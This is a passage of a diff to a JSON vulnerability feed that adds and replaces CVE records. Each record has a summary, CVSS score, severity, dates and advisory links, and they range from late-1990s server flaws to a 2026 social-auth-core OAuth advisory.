+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archive.cert.uni-stuttgart.de/archive/bugtraq/2001/07/msg00021.html",
+        "http://www.kb.cert.org/vuls/id/270083",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6793",
+        "http://archive.cert.uni-stuttgart.de/archive/bugtraq/2001/07/msg00021.html",
+        "http://www.kb.cert.org/vuls/id/270083"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1266",
+      "summary": "Directory traversal vulnerability in Doug Neal's HTTPD Daemon (DNHTTPD) before 0.4.1 allows remote attackers to view arbitrary files via a .. (dot dot) attack using the dot hex code '%2E'.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-07-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/apps/freshmeat/2001-07/0002.html",
+        "http://dnhttpd.sourceforge.net/changelog.html",
+        "http://archives.neohapsis.com/archives/apps/freshmeat/2001-07/0002.html",
+        "http://dnhttpd.sourceforge.net/changelog.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0186",
+      "summary": "smbmnt in Samba 2.x and 3.x on Linux 2.6, when installed setuid, allows local users to gain root privileges by mounting a Samba share that contains a setuid root program, whose setuid attributes are not cleared when the share is mounted.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2004-03-15",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=107636290906296&w=2",
+        "http://marc.info/?l=bugtraq&m=107657505718743&w=2",
+        "http://www.debian.org/security/2004/dsa-463",
+        "http://www.osvdb.org/3916",
+        "http://www.securityfocus.com/bid/9619"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-57176",
+      "summary": "### Impact\n\nThe Vend OAuth2 backend used only the numeric Vend `user_id` as the social-auth UID.\n\nWhen multiple Vend shops authenticate through the same application, users from different shops with the same internal Vend user ID could collide in the social-auth association table. A user from one shop could then be authenticated as the local account previously associated with the same numeric user ID from another shop.\n\nThe issue affects applications using the Vend OAuth2 backend with more than one Vend shop.\n\n### Patches\n\nThe issue has been fixed by scoping Vend social-auth UIDs by shop.\n\nUsers should upgrade to a patched version.\n\nFix:\n\n* https://github.com/python-social-auth/social-core/pull/1795\n\n### Workarounds\n\nApplications that cannot upgrade immediately should restrict the Vend OAuth2 backend to a single trusted Vend shop.\n\nIf Vend authentication is not required, the Vend backend can also be disabled by removing it from `SOCIAL_AUTH_AUTHENTICATION_BACKENDS`.\n\nThere is no complete workaround while continuing to allow authentication from multiple Vend shops with the vulnerable backend.\n\n### Credits\n\nReported through GitHub private vulnerability reporting by Liyi Zhou, Ziyue Wang, Strick, Maurice, and Chenchen Yu from the University of Sydney security research team.\n\nReporter references:\n\n* https://lzhou1110.github.io/\n* https://zyy0530.github.io/\n* https://str1ckl4nd.github.io/\n* https://maurice.busystar.org/\n* https://7thparkk.github.io/",
+      "cvssScore": 6.8,
+      "severity": "Medium",
+      "published": "2026-09-24",
+      "modified": "2026-09-24",
       "cwe": {
-        "cwe_id": "CWE-190",
-        "name": "Integer Overflow or Wraparound"
+        "cwe_id": "CWE-289",
+        "name": "Authentication Bypass by Alternate Name"
       },
       "references": [
-        "https://github.com/dotnet/wpf/security/advisories/GHSA-f63g-mx39-3r38",
-        "https://github.com/dotnet/announcements/issues/469",
-        "https://github.com/dotnet/wpf/issues/12020",
-        "https://github.com/advisories/GHSA-f63g-mx39-3r38"
+        "https://github.com/python-social-auth/social-core/security/advisories/GHSA-fp7w-m676-w7gc",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-57176",
+        "https://github.com/python-social-auth/social-core/pull/1795",
+        "https://github.com/python-social-auth/social-core/commit/dee7ad1785877afd355dd6860598823d2631b76e",
+        "https://github.com/python-social-auth/social-core/releases/tag/5.0.0"
       ],
       "vulnerableProducts": [
-        "Microsoft.WindowsDesktop.App.Runtime.win-arm64 nuget",
-        "Microsoft.WindowsDesktop.App.Runtime.win-x64 nuget",
-        "Microsoft.WindowsDesktop.App.Runtime.win-x86 nuget"
+        "social-auth-core pip"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-90769",
-      "summary": "Open Notebook before 1.11.0 fails to validate the URL parameter in POST /api/sources endpoint, allowing authenticated users to perform server-side requests to internal services. Attackers can supply arbitrary URLs to read cloud metadata, internal network services, and localhost-bound services through the application server's direct HTTP requests.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2026-09-13",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-90769",
-        "https://github.com/lfnovo/open-notebook/issues/1284",
-        "https://github.com/lfnovo/open-notebook/commit/9045ea50196927eac7de647bb5b7009349236fb4",
-        "https://github.com/lfnovo/open-notebook",
-        "https://github.com/lfnovo/open-notebook/blob/8889087e317177d7b6e286342ab34e0c9c01d43e/api/routers/sources.py"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-90767",
-      "summary": "Froxlor before 2.3.12 fails to properly validate multi-line SSH public keys in the SshKeys::add() endpoint, allowing customers to inject arbitrary lines into authorized_keys files. Attackers can inject malicious SSH key entries with option directives to gain persistent unauthorized access that survives key deletion and SSH access revocation.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-09-13",
-      "modified": "2026-09-13",
-      "cwe": null,
-      "references": [
-        "https://github.com/froxlor/Froxlor/security/advisories/GHSA-p3v3-74gc-jh5f",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-90767",
-        "https://github.com/froxlor/Froxlor",
-        "https://github.com/froxlor/Froxlor/blob/2.3.10/lib/Froxlor/Api/Commands/SshKeys.php",
-        "https://github.com/froxlor/Froxlor/blob/2.3.10/lib/Froxlor/Cron/System/SshKeys.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2194",
-      "summary": "MailEnable Professional Edition before 1.53 and Enterprise Edition before 1.02 allows remote attackers to cause a denial of service (crash) via malformed (1) SMTP or (2) IMAP commands.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-12-31",
+      "id": "CVE-2000-0752",
+      "summary": "Buffer overflows in brouted in FreeBSD and possibly other OSes allows local users to gain root privileges via long command line arguments.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2000-10-20",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.mailenable.com/enterprisehistory.asp",
-        "http://www.mailenable.com/professionalhistory.asp",
-        "http://www.securityfocus.com/bid/11418",
-        "http://www.mailenable.com/enterprisehistory.asp",
-        "http://www.mailenable.com/professionalhistory.asp"
+        "http://archives.neohapsis.com/archives/freebsd/2000-08/0339.html",
+        "http://www.securityfocus.com/bid/1629",
+        "http://archives.neohapsis.com/archives/freebsd/2000-08/0339.html",
+        "http://www.securityfocus.com/bid/1629"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0753",
+      "summary": "The Microsoft Outlook mail client identifies the physical path of the sender's machine within a winmail.dat attachment to Rich Text Format (RTF) files.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/201422",
+        "http://www.securityfocus.com/archive/1/78240",
+        "http://www.securityfocus.com/bid/1631",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5508",
+        "http://www.securityfocus.com/archive/1/201422"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0754",
+      "summary": "Vulnerability in HP OpenView Network Node Manager (NMM) version 6.1 related to passwords.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0144.html",
+        "http://www.securityfocus.com/bid/1581",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0144.html",
+        "http://www.securityfocus.com/bid/1581"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0755",
+      "summary": "Vulnerability in the newgrp command in HP-UX 11.00 allows local users to gain privileges.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0144.html",
+        "http://www.securityfocus.com/bid/1581",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-08/0144.html",
+        "http://www.securityfocus.com/bid/1581"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0756",
+      "summary": "Microsoft Outlook 2000 does not properly process long or malformed fields in vCard (.vcf) files, which allows attackers to cause a denial of service.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/1633",
+        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=Springmail.105.967737080.0.16997300%40www.springmail.com",
+        "http://www.securityfocus.com/bid/1633",
+        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=Springmail.105.967737080.0.16997300%40www.springmail.com"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0421",
+      "summary": "IIS 4.0 allows local users to bypass the \"User cannot change password\" policy for Windows NT by directly calling .htr password changing programs in the /iisadmpwd directory, including (1) aexp2.htr, (2) aexp2b.htr, (3) aexp3.htr , or (4) aexp4.htr.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-08-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://online.securityfocus.com/archive/1/259963",
+        "http://www.iss.net/security_center/static/8388.php",
+        "http://www.securityfocus.com/bid/4236",
+        "http://online.securityfocus.com/archive/1/259963",
+        "http://www.iss.net/security_center/static/8388.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0411",
+      "summary": "Sun ONE Application Server 7.0 for Windows 2000/XP allows remote attackers to obtain JSP source code via a request that uses the uppercase \".JSP\" extension instead of the lowercase .jsp extension.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-06-30",
+      "modified": null,
+      "cwe": "CWE-178",
+      "references": [
+        "http://marc.info/?l=bugtraq&m=105409846029475&w=2",
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert%2F55221&zone_32=category%3Asecurity",
+        "http://sunsolve.sun.com/search/document.do?assetkey=1-77-1000610.1-1",
+        "http://www.ciac.org/ciac/bulletins/n-103.shtml",
+        "http://www.iss.net/security_center/static/12093.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1728",
+      "summary": "Buffer overflow in British National Corpus SARA (sarad) allows remote attackers to execute arbitrary code by calling the client with a long string.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2004-08-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=109308454122827&w=2",
+        "http://secunia.com/advisories/12348",
+        "http://www.securityfocus.com/bid/10984",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17060",
+        "http://marc.info/?l=bugtraq&m=109308454122827&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0925",
+      "summary": "The default installation of SmartWin CyberOffice Shopping Cart 2 (aka CyberShop) installs the _private directory with world readable permissions, which allows remote attackers to obtain sensitive information.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-12-19",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/win2ksecadvice/2000-q4/0001.html",
+        "http://marc.info/?l=bugtraq&m=97050819812055&w=2",
+        "http://www.securityfocus.com/bid/1734",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5318",
+        "http://archives.neohapsis.com/archives/win2ksecadvice/2000-q4/0001.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0926",
+      "summary": "SmartWin CyberOffice Shopping Cart 2 (aka CyberShop) allows remote attackers to modify price information by changing the \"Price\" hidden form variable.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2000-12-19",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/win2ksecadvice/2000-q4/0000.html",
+        "http://marc.info/?l=bugtraq&m=97050627707128&w=2",
+        "http://www.securityfocus.com/bid/1733",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5319",
+        "http://archives.neohapsis.com/archives/win2ksecadvice/2000-q4/0000.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0595",
+      "summary": "The strip_tags function in PHP 4.x up to 4.3.7, and 5.x up to 5.0.0RC3, does not filter null (\\0) characters within tag names when restricting input to allowed tags, which allows dangerous tags to be processed by web browsers such as Internet Explorer and Safari, which ignore null characters and facilitate the exploitation of cross-site scripting (XSS) vulnerabilities.",
+      "cvssScore": 6.8,
+      "severity": "Medium",
+      "published": "2004-07-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000847",
+        "http://lists.grok.org.uk/pipermail/full-disclosure/2004-July/023909.html",
+        "http://marc.info/?l=bugtraq&m=108981780109154&w=2",
+        "http://marc.info/?l=bugtraq&m=108982983426031&w=2",
+        "http://marc.info/?l=bugtraq&m=109051444105182&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1297",
+      "summary": "cmdtool in OpenWindows 3.0 and XView 3.0 in SunOS 4.1.4 and earlier allows attackers with physical access to the system to display unechoed characters (such as those from password prompts) via the L2/AGAIN key.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "1998-07-15",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fpatches%2F100452&zone_32=10045%2A%20",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7482",
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fpatches%2F100452&zone_32=10045%2A%20",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7482"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1406",
+      "summary": "dumpreg in Red Hat Linux 5.1 opens /dev/mem with O_RDWR access, which allows local users to cause a denial of service (crash) by redirecting fd 1 (stdout) to the kernel.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "1998-07-29",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=90221104526185&w=2",
+        "http://marc.info/?l=bugtraq&m=90221104526192&w=2",
+        "http://www.securityfocus.com/bid/372",
+        "http://marc.info/?l=bugtraq&m=90221104526185&w=2",
+        "http://marc.info/?l=bugtraq&m=90221104526192&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1008",
+      "summary": "Cross-site scripting vulnerability in PowerBASIC urlcount.cgi, as included in Lil' HTTP web server, allows remote attackers to execute arbitrary web script in other web browsers via a request to urlcount.cgi that contains the script, which is not filtered when the REPORT capability prints the original request.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-10-04",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-06/0332.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0072.html",
+        "http://www.iss.net/security_center/static/9445.php",
+        "http://www.securityfocus.com/bid/5115",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-06/0332.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1009",
+      "summary": "Cross-site scripting vulnerability in PowerBASIC pbcgi.cgi, as included in Lil' HTTP web server, allows remote attackers to execute arbitrary web script in other web browsers via the (1) \"Name\" or (2) \"E-mail\" parameters.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-10-04",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0112.html",
+        "http://www.iss.net/security_center/static/9548.php",
+        "http://www.securityfocus.com/bid/5211",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-07/0112.html",
+        "http://www.iss.net/security_center/static/9548.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1010",
+      "summary": "Lotus Domino R4 allows remote attackers to bypass access restrictions for files in the web root via an HTTP request appended with a \"?\" character, which is treated as a wildcard character and bypasses the web handlers.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-10-04",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0001.html",
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0001.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1011",
+      "summary": "Buffer overflow in web server for Tivoli Management Framework (TMF) Endpoint 3.6.x through 3.7.1, before Fixpack 2, allows remote attackers to cause a denial of service or execute arbitrary code via a long HTTP GET request.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-10-04",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/vulnwatch/2002-q3/0023.html",
+        "http://online.securityfocus.com/archive/1/282292",
+        "http://www.iss.net/security_center/static/9555.php",
+        "http://www.securityfocus.com/bid/5235",
+        "http://www.tivoli.com/secure/support/documents/security/mgt-fwk-http-vul.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0054",
+      "summary": "Sun's ftpd daemon can be subjected to a denial of service.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1998-06-10",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/171",
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/171"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1178",
+      "summary": "Sambar Server 4.1 beta allows remote attackers to obtain sensitive information about the server via an HTTP request for the dumpenv.pl script.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1998-06-10",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/9505",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3223",
+        "http://www.securityfocus.com/archive/1/9505",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3223"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1085",
+      "summary": "SSH 1.2.25, 1.2.23, and other versions, when used in in CBC (Cipher Block Chaining) or CFB (Cipher Feedback 64 bits) modes, allows remote attackers to insert arbitrary data into an existing stream between an SSH client and server by using a known plaintext attack and computing a valid CRC-32 checksum for the packet, aka the \"SSH insertion attack.\"",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1998-06-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=90221103125884&w=2",
+        "http://marc.info/?l=bugtraq&m=90221104525878&w=2",
+        "http://www.iss.net/security_center/static/1126.php",
+        "http://www.kb.cert.org/vuls/id/13877",
+        "http://marc.info/?l=bugtraq&m=90221103125884&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0104",
+      "summary": "MDaemon Pro 3.5.1 and earlier allows local users to bypass the \"lock server\" security setting by pressing the Cancel button at the password prompt, then pressing the enter key.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/151156",
+        "http://www.securityfocus.com/bid/2115",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5763",
+        "http://www.securityfocus.com/archive/1/151156",
+        "http://www.securityfocus.com/bid/2115"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0105",
+      "summary": "Vulnerability in top in HP-UX 11.04 and earlier allows local users to overwrite files owned by the \"sys\" group.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/hp/2000-q4/0079.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5773",
+        "http://archives.neohapsis.com/archives/hp/2000-q4/0079.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5773"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0106",
+      "summary": "Vulnerability in inetd server in HP-UX 11.04 and earlier allows attackers to cause a denial of service when the \"swait\" state is used by a server.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-02-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/hp/2001-q1/0009.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5904",
+        "http://archives.neohapsis.com/archives/hp/2001-q1/0009.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5904"
       ],
       "vulnerableProducts": [],
       "isExploited": false
